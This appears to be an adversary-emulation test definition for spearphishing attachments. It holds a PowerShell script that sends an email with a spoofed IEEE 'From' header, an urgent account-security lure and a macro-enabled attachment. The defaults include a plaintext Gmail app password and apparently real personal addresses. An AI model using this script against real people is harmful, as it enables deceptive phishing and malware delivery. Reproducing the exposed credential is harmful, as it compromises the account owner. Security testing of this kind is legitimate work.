attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server to use
        type: string
        default: "smtp.gmail.com"
      smtp_port:
        description: SMTP port
        type: integer
        default: 587  # TLS Port
      sender_email:
        description: Real email address for SMTP authentication (Return-Path)
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Replace with your domain for Return-Path
      spoofed_from_email:
        description: Email address to spoof in the "From" header
        type: string
        default: "IEEE Notification <chaymabouattour@ieee.org>"  # Spoofed email address
      reply_to_email:
        description: Reply-To email address
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
      recipient_email:
        description: Recipient email address
        type: string
        default: "oumaymakabadou2@gmail.com"  # Replace with the actual recipient's email address
      subject:
        description: Customized subject of the email
        type: string
        default: "Urgent: Please review the attached document"
      body:
        description: Customized body content of the email
        type: string
        default: |
          Dear User,<br>
          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
          Thank you for your cooperation.<br>
          Best regards,<br>
          The Security Team
      attachment_path:
        description: Path to the malicious attachment
        type: string
        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
      app_password:
        description: Application password for SMTP authentication
        type: string
        default: "wbae yozc iyut rykk"  # Application password generated for Gmail
      log_file:
        description: Path to the log file
        type: string
        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = "#{smtp_port}"
        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
        $spoofedFromEmail = "#{spoofed_from_email}"  # Spoofed address in the From header
        $replyTo = "#{reply_to_email}"  # Reply-To address
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
        
        # Custom headers to spoof the From field and increase realism
        $headers = @{
            "From" = $spoofedFromEmail  # Spoofed From header
            "X-Priority" = "1"  # High priority
            "X-MSMail-Priority" = "High"  # Mail priority
            "Importance" = "High"  # Importance level
        }

        Write-Host "üìß Sending a phishing email with spoofed headers..."
        try {
            # Sending the email with spoofed headers
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                -From $senderEmail -To $recipientEmail `
                -ReplyTo $replyTo `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachmentPath -Credential $credential `
                -Headers $headers -ErrorAction Stop
            Write-Host "‚úÖ Email sent successfully."
            
            # Log the result
            $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "‚ùå Error sending email: $_"
            exit 1
        }
